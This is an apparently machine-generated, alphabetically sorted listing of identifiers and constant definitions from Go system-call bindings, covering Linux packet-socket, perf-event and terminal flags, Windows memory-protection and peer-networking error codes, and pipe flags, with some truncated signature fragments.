Output
Output:
Overlapped) (err error)
Overlapped) (err error) = ReadFile
Overlapped) (err error) = WriteFile
Overlapped) (err error) = mswsock.AcceptEx
Overlapped) (err error) {
Overlapped) error {
Overrun   uint32
Owner        [8]byte
Owner       uint32
OwnerProcessID uint32
PACKET
PACKET_ADD_MEMBERSHIP                       = 0x1
PACKET_AUXDATA                              = 0x8
PACKET_BROADCAST                            = 0x1
PACKET_COPY_THRESH                          = 0x7
PACKET_DROP_MEMBERSHIP                      = 0x2
PACKET_FANOUT                               = 0x12
PACKET_FANOUT_CBPF                          = 0x6
PACKET_FANOUT_CPU                           = 0x2
PACKET_FANOUT_DATA                          = 0x16
PACKET_FANOUT_EBPF                          = 0x7
PACKET_FANOUT_FLAG_DEFRAG                   = 0x8000
PACKET_FANOUT_FLAG_ROLLOVER                 = 0x1000
PACKET_FANOUT_FLAG_UNIQUEID                 = 0x2000
PACKET_FANOUT_HASH                          = 0x0
PACKET_FANOUT_LB                            = 0x1
PACKET_FANOUT_QM                            = 0x5
PACKET_FANOUT_RND                           = 0x4
PACKET_FANOUT_ROLLOVER                      = 0x3
PACKET_FASTROUTE                            = 0x6
PACKET_HDRLEN                               = 0xb
PACKET_HOST                                 = 0x0
PACKET_IGNORE_OUTGOING                      = 0x17
PACKET_KERNEL                               = 0x7
PACKET_LOOPBACK                             = 0x5
PACKET_LOSS                                 = 0xe
PACKET_MR_ALLMULTI                          = 0x2
PACKET_MR_MULTICAST                         = 0x0
PACKET_MR_PROMISC                           = 0x1
PACKET_MR_UNICAST                           = 0x3
PACKET_MULTICAST                            = 0x2
PACKET_ORIGDEV                              = 0x9
PACKET_OTHERHOST                            = 0x3
PACKET_OUTGOING                             = 0x4
PACKET_QDISC_BYPASS                         = 0x14
PACKET_RECV_OUTPUT                          = 0x3
PACKET_RESERVE                              = 0xc
PACKET_ROLLOVER_STATS                       = 0x15
PACKET_RX_RING                              = 0x5
PACKET_STATISTICS                           = 0x6
PACKET_TIMESTAMP                            = 0x11
PACKET_TX_HAS_OFF                           = 0x13
PACKET_TX_RING                              = 0xd
PACKET_TX_TIMESTAMP                         = 0x10
PACKET_USER                                 = 0x6
PACKET_VERSION                              = 0xa
PACKET_VNET_HDR                             = 0xf
PAGE_EXECUTE           = 0x00000010
PAGE_EXECUTE_READ      = 0x00000020
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_EXECUTE_WRITECOPY = 0x00000080
PAGE_GUARD             = 0x00000100
PAGE_NOACCESS          = 0x00000001
PAGE_NOCACHE           = 0x00000200
PAGE_READONLY          = 0x00000002
PAGE_READWRITE         = 0x00000004
PAGE_TARGETS_INVALID   = 0x40000000
PAGE_TARGETS_NO_UPDATE = 0x40000000
PAGE_WRITECOMBINE      = 0x00000400
PAGE_WRITECOPY         = 0x00000008
PAR/ 
PARENB                                  = 0x1000
PARENB                            = 0x1000
PARENB                           = 0x100
PARENB                           = 0x1000
PARENB                          = 0x0200
PARENB                         = 0x1000
PARENB                        = 0x100
PAREXT                        = 0x100000
PARITY_CRC16_PR0                            = 0x2
PARITY_CRC16_PR0_CCITT                      = 0x4
PARITY_CRC16_PR1                            = 0x3
PARITY_CRC16_PR1_CCITT                      = 0x5
PARITY_CRC32_PR0_CCITT                      = 0x6
PARITY_CRC32_PR1_CCITT                      = 0x7
PARITY_DEFAULT                              = 0x0
PARITY_NONE                                 = 0x1
PARMRK                                      = 0x8
PARMRK                                  = 0x8
PARMRK                            = 0x8
PARMRK                          = 0x0400
PARMRK                         = 0x8
PARMRK                        = 0x8
PARODD                                  = 0x2000
PARODD                            = 0x2000
PARODD                           = 0x200
PARODD                           = 0x2000
PARODD                         = 0x2000
PARODD                        = 0x200
PART$
PCK)$/ 
PEB) = ntdll.RtlGetCurrentPeb
PEB) {
PEB)(unsafe.Pointer(r0))
PEB_LDR_DATA
PEERDIST_ERROR_ALREADY_COMPLETED                                          syscall.Errno = 4060
PEERDIST_ERROR_ALREADY_EXISTS                                             syscall.Errno = 4058
PEERDIST_ERROR_ALREADY_INITIALIZED                                        syscall.Errno = 4055
PEERDIST_ERROR_CANNOT_PARSE_CONTENTINFO                                   syscall.Errno = 4051
PEERDIST_ERROR_CONTENTINFO_VERSION_UNSUPPORTED                            syscall.Errno = 4050
PEERDIST_ERROR_INVALIDATED                                                syscall.Errno = 4057
PEERDIST_ERROR_INVALID_CONFIGURATION                                      syscall.Errno = 4063
PEERDIST_ERROR_MISSING_DATA                                               syscall.Errno = 4052
PEERDIST_ERROR_NOT_INITIALIZED                                            syscall.Errno = 4054
PEERDIST_ERROR_NOT_LICENSED                                               syscall.Errno = 4064
PEERDIST_ERROR_NO_MORE                                                    syscall.Errno = 4053
PEERDIST_ERROR_OPERATION_NOTFOUND                                         syscall.Errno = 4059
PEERDIST_ERROR_OUT_OF_BOUNDS                                              syscall.Errno = 4061
PEERDIST_ERROR_SERVICE_UNAVAILABLE                                        syscall.Errno = 4065
PEERDIST_ERROR_SHUTDOWN_IN_PROGRESS                                       syscall.Errno = 4056
PEERDIST_ERROR_TRUST_FAILURE                                              syscall.Errno = 4066
PEERDIST_ERROR_VERSION_UNSUPPORTED                                        syscall.Errno = 4062
PEER_E_ALREADY_LISTENING                                                  Handle        = 0x80630107
PEER_E_CANNOT_CONVERT_PEER_NAME                                           Handle        = 0x80634001
PEER_E_CANNOT_START_SERVICE                                               Handle        = 0x80630003
PEER_E_CERT_STORE_CORRUPTED                                               Handle        = 0x80630801
PEER_E_CHAIN_TOO_LONG                                                     Handle        = 0x80630703
PEER_E_CIRCULAR_CHAIN_DETECTED                                            Handle        = 0x80630706
PEER_E_CLASSIFIER_TOO_LONG                                                Handle        = 0x80630201
PEER_E_CLOUD_NAME_AMBIGUOUS                                               Handle        = 0x80631005
PEER_E_CONNECTION_FAILED                                                  Handle        = 0x80630109
PEER_E_CONNECTION_NOT_AUTHENTICATED                                       Handle        = 0x8063010A
PEER_E_CONNECTION_NOT_FOUND                                               Handle        = 0x80630103
PEER_E_CONNECTION_REFUSED                                                 Handle        = 0x8063010B
PEER_E_CONNECT_SELF                                                       Handle        = 0x80630106
PEER_E_CONTACT_NOT_FOUND                                                  Handle        = 0x80636001
PEER_E_DATABASE_ACCESSDENIED                                              Handle        = 0x80630302
PEER_E_DATABASE_ALREADY_PRESENT                                           Handle        = 0x80630305
PEER_E_DATABASE_NOT_PRESENT                                               Handle        = 0x80630306
PEER_E_DBINITIALIZATION_FAILED                                            Handle        = 0x80630303
PEER_E_DBNAME_CHANGED                                                     Handle        = 0x80630011
PEER_E_DEFERRED_VALIDATION                                                Handle        = 0x80632030
PEER_E_DUPLICATE_GRAPH                                                    Handle        = 0x80630012
PEER_E_EVENT_HANDLE_NOT_FOUND                                             Handle        = 0x80630501
PEER_E_FW_BLOCKED_BY_POLICY                                               Handle        = 0x80637009
PEER_E_FW_BLOCKED_BY_SHIELDS_UP                                           Handle        = 0x8063700A
PEER_E_FW_DECLINED                                                        Handle        = 0x8063700B
PEER_E_FW_EXCEPTION_DISABLED                                              Handle        = 0x80637008
PEER_E_GRAPH_IN_USE                                                       Handle        = 0x80630015
PEER_E_GRAPH_NOT_READY                                                    Handle        = 0x80630013
PEER_E_GRAPH_SHUTTING_DOWN                                                Handle        = 0x80630014
PEER_E_GROUPS_EXIST                                                       Handle        = 0x80630204
PEER_E_GROUP_IN_USE                                                       Handle        = 0x80632092
PEER_E_GROUP_NOT_READY                                                    Handle        = 0x80632091
PEER_E_IDENTITY_DELETED                                                   Handle        = 0x806320A0
PEER_E_IDENTITY_NOT_FOUND                                                 Handle        = 0x80630401
PEER_E_INVALID_ADDRESS                                                    Handle        = 0x80637007
PEER_E_INVALID_ATTRIBUTES                                                 Handle        = 0x80630602
PEER_E_INVALID_CLASSIFIER                                                 Handle        = 0x80632060
PEER_E_INVALID_CLASSIFIER_PROPERTY                                        Handle        = 0x80632072
PEER_E_INVALID_CREDENTIAL                                                 Handle        = 0x80632082
PEER_E_INVALID_CREDENTIAL_INFO                                            Handle        = 0x80632081
PEER_E_INVALID_DATABASE                                                   Handle        = 0x80630016
PEER_E_INVALID_FRIENDLY_NAME                                              Handle        = 0x80632070
PEER_E_INVALID_GRAPH                                                      Handle        = 0x80630010
PEER_E_INVALID_GROUP                                                      Handle        = 0x80632093
PEER_E_INVALID_GROUP_PROPERTIES                                           Handle        = 0x80632040
PEER_E_INVALID_PEER_HOST_NAME                                             Handle        = 0x80634002
PEER_E_INVALID_PEER_NAME                                                  Handle        = 0x80632050
PEER_E_INVALID_RECORD                                                     Handle        = 0x80632010
PEER_E_INVALID_RECORD_EXPIRATION                                          Handle        = 0x80632080
PEER_E_INVALID_RECORD_SIZE                                                Handle        = 0x80632083
PEER_E_INVALID_ROLE_PROPERTY                                              Handle        = 0x80632071
PEER_E_INVALID_SEARCH                                                     Handle        = 0x80630601
PEER_E_INVALID_TIME_PERIOD                                                Handle        = 0x80630705
PEER_E_INVITATION_NOT_TRUSTED                                             Handle        = 0x80630701
PEER_E_INVITE_CANCELLED                                                   Handle        = 0x80637000
PEER_E_INVITE_RESPONSE_NOT_AVAILABLE                                      Handle        = 0x80637001
PEER_E_IPV6_NOT_INSTALLED                                                 Handle        = 0x80630001
PEER_E_MAX_RECORD_SIZE_EXCEEDED                                           Handle        = 0x80630304
PEER_E_NODE_NOT_FOUND                                                     Handle        = 0x80630108
PEER_E_NOT_AUTHORIZED                                                     Handle        = 0x80632020
PEER_E_NOT_INITIALIZED                                                    Handle        = 0x80630002
PEER_E_NOT_LICENSED                                                       Handle        = 0x80630004
PEER_E_NOT_SIGNED_IN                                                      Handle        = 0x80637003
PEER_E_NO_CLOUD                                                           Handle        = 0x80631001
PEER_E_NO_KEY_ACCESS                                                      Handle        = 0x80630203
PEER_E_NO_MEMBERS_FOUND                                                   Handle        = 0x80632094
PEER_E_NO_MEMBER_CONNECTIONS                                              Handle        = 0x80632095
PEER_E_NO_MORE                                                            Handle        = 0x80634003
PEER_E_PASSWORD_DOES_NOT_MEET_POLICY                                      Handle        = 0x80632021
PEER_E_PNRP_DUPLICATE_PEER_NAME                                           Handle        = 0x80634005
PEER_E_PRIVACY_DECLINED                                                   Handle        = 0x80637004
PEER_E_RECORD_NOT_FOUND                                                   Handle        = 0x80630301
PEER_E_SERVICE_NOT_AVAILABLE                                              Handle        = 0x806320A1
PEER_E_TIMEOUT                                                            Handle        = 0x80637005
PEER_E_TOO_MANY_ATTRIBUTES                                                Handle        = 0x80630017
PEER_E_TOO_MANY_IDENTITIES                                                Handle        = 0x80630202
PEER_E_UNABLE_TO_LISTEN                                                   Handle        = 0x80632096
PEER_E_UNSUPPORTED_VERSION                                                Handle        = 0x80632090
PEER_S_ALREADY_A_MEMBER                                                   Handle        = 0x00630006
PEER_S_ALREADY_CONNECTED                                                  Handle        = 0x00632000
PEER_S_GRAPH_DATA_CREATED                                                 Handle        = 0x00630001
PEER_S_NO_CONNECTIVITY                                                    Handle        = 0x00630005
PEER_S_NO_EVENT_DATA                                                      Handle        = 0x00630002
PEER_S_SUBSCRIPTION_EXISTS                                                Handle        = 0x00636000
PENDIN                                  = 0x20000000
PENDIN                            = 0x20000000
PENDIN                           = 0x20000000
PENDIN                           = 0x4000
PENDIN                         = 0x20000000
PENDIN                        = 0x20000000
PENDIN                        = 0x4000
PERF_/ 
PERF_ATTR_SIZE_VER0                         = 0x40
PERF_ATTR_SIZE_VER1                         = 0x48
PERF_ATTR_SIZE_VER2                         = 0x50
PERF_ATTR_SIZE_VER3                         = 0x60
PERF_ATTR_SIZE_VER4                         = 0x68
PERF_ATTR_SIZE_VER5                         = 0x70
PERF_ATTR_SIZE_VER6                         = 0x78
PERF_ATTR_SIZE_VER7                         = 0x80
PERF_AUX_FLAG_COLLISION                     = 0x8
PERF_AUX_FLAG_CORESIGHT_FORMAT_CORESIGHT    = 0x0
PERF_AUX_FLAG_CORESIGHT_FORMAT_RAW          = 0x100
PERF_AUX_FLAG_OVERWRITE                     = 0x2
PERF_AUX_FLAG_PARTIAL                       = 0x4
PERF_AUX_FLAG_PMU_FORMAT_TYPE_MASK          = 0xff00
PERF_AUX_FLAG_TRUNCATED                     = 0x1
PERF_BPF_EVENT_MAX                    = 0x3
PERF_BPF_EVENT_PROG_LOAD              = 0x1
PERF_BPF_EVENT_PROG_UNLOAD            = 0x2
PERF_BPF_EVENT_UNKNOWN                = 0x0
PERF_BR_CALL                          = 0x4
PERF_BR_COND                          = 0x1
PERF_BR_COND_CALL                     = 0x9
PERF_BR_COND_RET                      = 0xa
PERF_BR_ERET                          = 0xb
PERF_BR_IND                           = 0x3
PERF_BR_IND_CALL                      = 0x5
PERF_BR_IRQ                           = 0xc
PERF_BR_MAX                           = 0xd
PERF_BR_RET                           = 0x6
PERF_BR_SYSCALL                       = 0x7
PERF_BR_SYSRET                        = 0x8
PERF_BR_UNCOND                        = 0x2
PERF_BR_UNKNOWN                       = 0x0
PERF_CONTEXT_GUEST                    = -0x800
PERF_CONTEXT_GUEST_KERNEL             = -0x880
PERF_CONTEXT_GUEST_USER               = -0xa00
PERF_CONTEXT_HV                       = -0x20
PERF_CONTEXT_KERNEL                   = -0x80
PERF_CONTEXT_MAX                      = -0xfff
PERF_CONTEXT_USER                     = -0x200
PERF_COUNT_HW_BRANCH_INSTRUCTIONS     = 0x4
PERF_COUNT_HW_BRANCH_MISSES           = 0x5
PERF_COUNT_HW_BUS_CYCLES              = 0x6
PERF_COUNT_HW_CACHE_BPU               = 0x5
PERF_COUNT_HW_CACHE_DTLB              = 0x3
PERF_COUNT_HW_CACHE_ITLB              = 0x4
PERF_COUNT_HW_CACHE_L1D               = 0x0
PERF_COUNT_HW_CACHE_L1I               = 0x1
PERF_COUNT_HW_CACHE_LL                = 0x2
PERF_COUNT_HW_CACHE_MAX               = 0x7
PERF_COUNT_HW_CACHE_MISSES            = 0x3
PERF_COUNT_HW_CACHE_NODE              = 0x6
PERF_COUNT_HW_CACHE_OP_MAX            = 0x3
PERF_COUNT_HW_CACHE_OP_PREFETCH       = 0x2
PERF_COUNT_HW_CACHE_OP_READ           = 0x0
PERF_COUNT_HW_CACHE_OP_WRITE          = 0x1
PERF_COUNT_HW_CACHE_REFERENCES        = 0x2
PERF_COUNT_HW_CACHE_RESULT_ACCESS     = 0x0
PERF_COUNT_HW_CACHE_RESULT_MAX        = 0x2
PERF_COUNT_HW_CACHE_RESULT_MISS       = 0x1
PERF_COUNT_HW_CPU_CYCLES              = 0x0
PERF_COUNT_HW_INSTRUCTIONS            = 0x1
PERF_COUNT_HW_MAX                     = 0xa
PERF_COUNT_HW_REF_CPU_CYCLES          = 0x9
PERF_COUNT_HW_STALLED_CYCLES_BACKEND  = 0x8
PERF_COUNT_HW_STALLED_CYCLES_FRONTEND = 0x7
PERF_COUNT_SW_ALIGNMENT_FAULTS        = 0x7
PERF_COUNT_SW_BPF_OUTPUT              = 0xa
PERF_COUNT_SW_CONTEXT_SWITCHES        = 0x3
PERF_COUNT_SW_CPU_CLOCK               = 0x0
PERF_COUNT_SW_CPU_MIGRATIONS          = 0x4
PERF_COUNT_SW_DUMMY                   = 0x9
PERF_COUNT_SW_EMULATION_FAULTS        = 0x8
PERF_COUNT_SW_MAX                     = 0xc
PERF_COUNT_SW_PAGE_FAULTS             = 0x2
PERF_COUNT_SW_PAGE_FAULTS_MAJ         = 0x6
PERF_COUNT_SW_PAGE_FAULTS_MIN         = 0x5
PERF_COUNT_SW_TASK_CLOCK              = 0x1
PERF_EVENT_IOC_DISABLE           = 0x20002401
PERF_EVENT_IOC_DISABLE           = 0x2401
PERF_EVENT_IOC_ENABLE            = 0x20002400
PERF_EVENT_IOC_ENABLE            = 0x2400
PERF_EVENT_IOC_ID                = 0x40042407
PERF_EVENT_IOC_ID                = 0x40082407
PERF_EVENT_IOC_ID                = 0x80042407
PERF_EVENT_IOC_ID                = 0x80082407
PERF_EVENT_IOC_MODIFY_ATTRIBUTES = 0x4004240b
PERF_EVENT_IOC_MODIFY_ATTRIBUTES = 0x4008240b
PERF_EVENT_IOC_MODIFY_ATTRIBUTES = 0x8004240b
PERF_EVENT_IOC_MODIFY_ATTRIBUTES = 0x8008240b
PERF_EVENT_IOC_PAUSE_OUTPUT      = 0x40042409
PERF_EVENT_IOC_PAUSE_OUTPUT      = 0x80042409
PERF_EVENT_IOC_PERIOD            = 0x40082404
PERF_EVENT_IOC_PERIOD            = 0x80082404
PERF_EVENT_IOC_QUERY_BPF         = 0xc004240a
PERF_EVENT_IOC_QUERY_BPF         = 0xc008240a
PERF_EVENT_IOC_REFRESH           = 0x20002402
PERF_EVENT_IOC_REFRESH           = 0x2402
PERF_EVENT_IOC_RESET             = 0x20002403
PERF_EVENT_IOC_RESET             = 0x2403
PERF_EVENT_IOC_SET_BPF           = 0x40042408
PERF_EVENT_IOC_SET_BPF           = 0x80042408
PERF_EVENT_IOC_SET_FILTER        = 0x40042406
PERF_EVENT_IOC_SET_FILTER        = 0x40082406
PERF_EVENT_IOC_SET_FILTER        = 0x80042406
PERF_EVENT_IOC_SET_FILTER        = 0x80082406
PERF_EVENT_IOC_SET_OUTPUT        = 0x20002405
PERF_EVENT_IOC_SET_OUTPUT        = 0x2405
PERF_FLAG_FD_CLOEXEC                        = 0x8
PERF_FLAG_FD_NO_GROUP                       = 0x1
PERF_FLAG_FD_OUTPUT                         = 0x2
PERF_FLAG_PID_CGROUP                        = 0x4
PERF_FORMAT_GROUP                     = 0x8
PERF_FORMAT_ID                        = 0x4
PERF_FORMAT_MAX                       = 0x10
PERF_FORMAT_TOTAL_TIME_ENABLED        = 0x1
PERF_FORMAT_TOTAL_TIME_RUNNING        = 0x2
PERF_HW_EVENT_MASK                          = 0xffffffff
PERF_IOC_FLAG_GROUP                   = 0x1
PERF_MAX_CONTEXTS_PER_STACK                 = 0x8
PERF_MAX_STACK_DEPTH                        = 0x7f
PERF_MEM_BLK_ADDR                           = 0x4
PERF_MEM_BLK_DATA                           = 0x2
PERF_MEM_BLK_NA                             = 0x1
PERF_MEM_BLK_SHIFT                          = 0x28
PERF_MEM_HOPS_0                             = 0x1
PERF_MEM_HOPS_1                             = 0x2
PERF_MEM_HOPS_2                             = 0x3
PERF_MEM_HOPS_3                             = 0x4
PERF_MEM_HOPS_SHIFT                         = 0x2b
PERF_MEM_LOCK_LOCKED                        = 0x2
PERF_MEM_LOCK_NA                            = 0x1
PERF_MEM_LOCK_SHIFT                         = 0x18
PERF_MEM_LVLNUM_ANY_CACHE                   = 0xb
PERF_MEM_LVLNUM_L1                          = 0x1
PERF_MEM_LVLNUM_L2                          = 0x2
PERF_MEM_LVLNUM_L3                          = 0x3
PERF_MEM_LVLNUM_L4                          = 0x4
PERF_MEM_LVLNUM_LFB                         = 0xc
PERF_MEM_LVLNUM_NA                          = 0xf
PERF_MEM_LVLNUM_PMEM                        = 0xe
PERF_MEM_LVLNUM_RAM                         = 0xd
PERF_MEM_LVLNUM_SHIFT                       = 0x21
PERF_MEM_LVL_HIT                            = 0x2
PERF_MEM_LVL_IO                             = 0x1000
PERF_MEM_LVL_L1                             = 0x8
PERF_MEM_LVL_L2                             = 0x20
PERF_MEM_LVL_L3                             = 0x40
PERF_MEM_LVL_LFB                            = 0x10
PERF_MEM_LVL_LOC_RAM                        = 0x80
PERF_MEM_LVL_MISS                           = 0x4
PERF_MEM_LVL_NA                             = 0x1
PERF_MEM_LVL_REM_CCE1                       = 0x400
PERF_MEM_LVL_REM_CCE2                       = 0x800
PERF_MEM_LVL_REM_RAM1                       = 0x100
PERF_MEM_LVL_REM_RAM2                       = 0x200
PERF_MEM_LVL_SHIFT                          = 0x5
PERF_MEM_LVL_UNC                            = 0x2000
PERF_MEM_OP_EXEC                            = 0x10
PERF_MEM_OP_LOAD                            = 0x2
PERF_MEM_OP_NA                              = 0x1
PERF_MEM_OP_PFETCH                          = 0x8
PERF_MEM_OP_SHIFT                           = 0x0
PERF_MEM_OP_STORE                           = 0x4
PERF_MEM_REMOTE_REMOTE                      = 0x1
PERF_MEM_REMOTE_SHIFT                       = 0x25
PERF_MEM_SNOOPX_FWD                         = 0x1
PERF_MEM_SNOOPX_SHIFT                       = 0x26
PERF_MEM_SNOOP_HIT                          = 0x4
PERF_MEM_SNOOP_HITM                         = 0x10
PERF_MEM_SNOOP_MISS                         = 0x8
PERF_MEM_SNOOP_NA                           = 0x1
PERF_MEM_SNOOP_NONE                         = 0x2
PERF_MEM_SNOOP_SHIFT                        = 0x13
PERF_MEM_TLB_HIT                            = 0x2
PERF_MEM_TLB_L1                             = 0x8
PERF_MEM_TLB_L2                             = 0x10
PERF_MEM_TLB_MISS                           = 0x4
PERF_MEM_TLB_NA                             = 0x1
PERF_MEM_TLB_OS                             = 0x40
PERF_MEM_TLB_SHIFT                          = 0x1a
PERF_MEM_TLB_WK                             = 0x20
PERF_PMU_TYPE_SHIFT                         = 0x20
PERF_RECORD_AUX                       = 0xb
PERF_RECORD_AUX_OUTPUT_HW_ID          = 0x15
PERF_RECORD_BPF_EVENT                 = 0x12
PERF_RECORD_CGROUP                    = 0x13
PERF_RECORD_COMM                      = 0x3
PERF_RECORD_EXIT                      = 0x4
PERF_RECORD_FORK                      = 0x7
PERF_RECORD_ITRACE_START              = 0xc
PERF_RECORD_KSYMBOL                   = 0x11
PERF_RECORD_KSYMBOL_FLAGS_UNREGISTER        = 0x1
PERF_RECORD_KSYMBOL_TYPE_BPF          = 0x1
PERF_RECORD_KSYMBOL_TYPE_MAX          = 0x3
PERF_RECORD_KSYMBOL_TYPE_OOL          = 0x2
PERF_RECORD_KSYMBOL_TYPE_UNKNOWN      = 0x0
PERF_RECORD_LOST                      = 0x2
PERF_RECORD_LOST_SAMPLES              = 0xd
PERF_RECORD_MAX                       = 0x16
PERF_RECORD_MISC_COMM_EXEC                  = 0x2000
PERF_RECORD_MISC_CPUMODE_MASK               = 0x7
PERF_RECORD_MISC_CPUMODE_UNKNOWN            = 0x0
PERF_RECORD_MISC_EXACT_IP                   = 0x4000
PERF_RECORD_MISC_EXT_RESERVED               = 0x8000
PERF_RECORD_MISC_FORK_EXEC                  = 0x2000
PERF_RECORD_MISC_GUEST_KERNEL               = 0x4
PERF_RECORD_MISC_GUEST_USER                 = 0x5
PERF_RECORD_MISC_HYPERVISOR                 = 0x3
PERF_RECORD_MISC_KERNEL                     = 0x1
PERF_RECORD_MISC_MMAP_BUILD_ID              = 0x4000
PERF_RECORD_MISC_MMAP_DATA                  = 0x2000
PERF_RECORD_MISC_PROC_MAP_PARSE_TIMEOUT     = 0x1000
PERF_RECORD_MISC_SWITCH_OUT                 = 0x2000
PERF_RECORD_MISC_SWITCH_OUT_PREEMPT         = 0x4000
PERF_RECORD_MISC_USER                       = 0x2
PERF_RECORD_MMAP                      = 0x1
PERF_RECORD_MMAP2                     = 0xa
PERF_RECORD_NAMESPACES                = 0x10
PERF_RECORD_READ                      = 0x8
PERF_RECORD_SAMPLE                    = 0x9
PERF_RECORD_SWITCH                    = 0xe
PERF_RECORD_SWITCH_CPU_WIDE           = 0xf
PERF_RECORD_TEXT_POKE                 = 0x14
PERF_RECORD_THROTTLE                  = 0x5
PERF_RECORD_UNTHROTTLE                = 0x6
PERF_SAMPLE_ADDR                      = 0x8
PERF_SAMPLE_AUX                       = 0x100000
PERF_SAMPLE_BRANCH_ABORT_TX           = 0x80
PERF_SAMPLE_BRANCH_ABORT_TX_SHIFT     = 0x7
PERF_SAMPLE_BRANCH_ANY                = 0x8
PERF_SAMPLE_BRANCH_ANY_CALL           = 0x10
PERF_SAMPLE_BRANCH_ANY_CALL_SHIFT     = 0x4
PERF_SAMPLE_BRANCH_ANY_RETURN         = 0x20
PERF_SAMPLE_BRANCH_ANY_RETURN_SHIFT   = 0x5
PERF_SAMPLE_BRANCH_ANY_SHIFT          = 0x3
PERF_SAMPLE_BRANCH_CALL               = 0x2000
PERF_SAMPLE_BRANCH_CALL_SHIFT         = 0xd
PERF_SAMPLE_BRANCH_CALL_STACK         = 0x800
PERF_SAMPLE_BRANCH_CALL_STACK_SHIFT   = 0xb
PERF_SAMPLE_BRANCH_COND               = 0x400
PERF_SAMPLE_BRANCH_COND_SHIFT         = 0xa
PERF_SAMPLE_BRANCH_HV                 = 0x4
PERF_SAMPLE_BRANCH_HV_SHIFT           = 0x2
PERF_SAMPLE_BRANCH_HW_INDEX           = 0x20000
PERF_SAMPLE_BRANCH_HW_INDEX_SHIFT     = 0x11
PERF_SAMPLE_BRANCH_IND_CALL           = 0x40
PERF_SAMPLE_BRANCH_IND_CALL_SHIFT     = 0x6
PERF_SAMPLE_BRANCH_IND_JUMP           = 0x1000
PERF_SAMPLE_BRANCH_IND_JUMP_SHIFT     = 0xc
PERF_SAMPLE_BRANCH_IN_TX              = 0x100
PERF_SAMPLE_BRANCH_IN_TX_SHIFT        = 0x8
PERF_SAMPLE_BRANCH_KERNEL             = 0x2
PERF_SAMPLE_BRANCH_KERNEL_SHIFT       = 0x1
PERF_SAMPLE_BRANCH_MAX                = 0x40000
PERF_SAMPLE_BRANCH_MAX_SHIFT          = 0x12
PERF_SAMPLE_BRANCH_NO_CYCLES          = 0x8000
PERF_SAMPLE_BRANCH_NO_CYCLES_SHIFT    = 0xf
PERF_SAMPLE_BRANCH_NO_FLAGS           = 0x4000
PERF_SAMPLE_BRANCH_NO_FLAGS_SHIFT     = 0xe
PERF_SAMPLE_BRANCH_NO_TX              = 0x200
PERF_SAMPLE_BRANCH_NO_TX_SHIFT        = 0x9
PERF_SAMPLE_BRANCH_PLM_ALL                  = 0x7
PERF_SAMPLE_BRANCH_STACK              = 0x800
PERF_SAMPLE_BRANCH_TYPE_SAVE          = 0x10000
PERF_SAMPLE_BRANCH_TYPE_SAVE_SHIFT    = 0x10
PERF_SAMPLE_BRANCH_USER               = 0x1
PERF_SAMPLE_BRANCH_USER_SHIFT         = 0x0
PERF_SAMPLE_CALLCHAIN                 = 0x20
PERF_SAMPLE_CGROUP                    = 0x200000
PERF_SAMPLE_CODE_PAGE_SIZE            = 0x800000
PERF_SAMPLE_CPU                       = 0x80
PERF_SAMPLE_DATA_PAGE_SIZE            = 0x400000
PERF_SAMPLE_DATA_SRC                  = 0x8000
PERF_SAMPLE_ID                        = 0x40
PERF_SAMPLE_IDENTIFIER                = 0x10000
PERF_SAMPLE_IP                        = 0x1
PERF_SAMPLE_MAX                       = 0x2000000
PERF_SAMPLE_PERIOD                    = 0x100
PERF_SAMPLE_PHYS_ADDR                 = 0x80000
PERF_SAMPLE_RAW                       = 0x400
PERF_SAMPLE_READ                      = 0x10
PERF_SAMPLE_REGS_ABI_32               = 0x1
PERF_SAMPLE_REGS_ABI_64               = 0x2
PERF_SAMPLE_REGS_ABI_NONE             = 0x0
PERF_SAMPLE_REGS_INTR                 = 0x40000
PERF_SAMPLE_REGS_USER                 = 0x1000
PERF_SAMPLE_STACK_USER                = 0x2000
PERF_SAMPLE_STREAM_ID                 = 0x200
PERF_SAMPLE_TID                       = 0x2
PERF_SAMPLE_TIME                      = 0x4
PERF_SAMPLE_TRANSACTION               = 0x20000
PERF_SAMPLE_WEIGHT                    = 0x4000
PERF_SAMPLE_WEIGHT_STRUCT             = 0x1000000
PERF_SAMPLE_WEIGHT_TYPE                     = 0x1004000
PERF_TXN_ABORT_MASK                   = -0x100000000
PERF_TXN_ABORT_SHIFT                  = 0x20
PERF_TXN_ASYNC                        = 0x8
PERF_TXN_CAPACITY_READ                = 0x80
PERF_TXN_CAPACITY_WRITE               = 0x40
PERF_TXN_CONFLICT                     = 0x20
PERF_TXN_ELISION                      = 0x1
PERF_TXN_MAX                          = 0x100
PERF_TXN_RETRY                        = 0x10
PERF_TXN_SYNC                         = 0x4
PERF_TXN_TRANSACTION                  = 0x2
PERF_TYPE_BREAKPOINT                  = 0x5
PERF_TYPE_HARDWARE                    = 0x0
PERF_TYPE_HW_CACHE                    = 0x3
PERF_TYPE_MAX                         = 0x6
PERF_TYPE_RAW                         = 0x4
PERF_TYPE_SOFTWARE                    = 0x1
PERF_TYPE_TRACEPOINT                  = 0x2
PERSIST_E_NOTSELFSIZING                                                   Handle        = 0x800B000B
PERSIST_E_SIZEDEFINITE                                                    Handle        = 0x800B0009
PERSIST_E_SIZEINDEFINITE                                                  Handle        = 0x800B000A
PFL_HIDDEN                  = 0x00000004
PFL_MATCHES_PROTOCOL_ZERO   = 0x00000008
PFL_MULTIPLE_PROTO_ENTRIES  = 0x00000001
PFL_NETWORKDIRECT_PROVIDER  = 0x00000010
PFL_RECOMMENDED_PROTO_ENTRY = 0x00000002
PFXImportCertStore(pfx 
PF_FLUSH                          = 0x1
PGN     uint32
PGRP
PID          int32
PID   DEVPROPID
PIDFD_NONBLOCK = 0x4000
PIDFD_NONBLOCK = 0x80
PIDFD_NONBLOCK = 0x800
PIOD_READ_D  = 0x1
PIOD_READ_I  = 0x3
PIOD_WRITE_D = 0x2
PIOD_WRITE_I = 0x4
PIPEFS_MAGIC                                = 0x50495045
PIPE_ACCEPT_REMOTE_CLIENTS = 0x0
PIPE_ACCESS_DUPLEX   = 0x3
PIPE_ACCESS_INBOUND  = 0x1
PIPE_ACCESS_OUTBOUND = 0x2
PIPE_CLIENT_END = 0x0
PIPE_NOWAIT                = 0x1
PIPE_READMODE_BYTE         = 0x0
PIPE_READMODE_MESSAGE      = 0x2
PIPE_REJECT_REMOTE_CLIENTS = 0x8
PIPE_SERVER_END = 0x1
PIPE_TYPE_BYTE             = 0x0
PIPE_TYPE_MESSAGE          = 0x4
PIPE_UNLIMITED_INSTANCES = 255
PIPE_WAIT                  = 0x0
PKCS12_ALLOW_OVERWRITE_KEY         = 0x00004000
PKCS12_ALWAYS_CNG_KSP              = 0x00000200
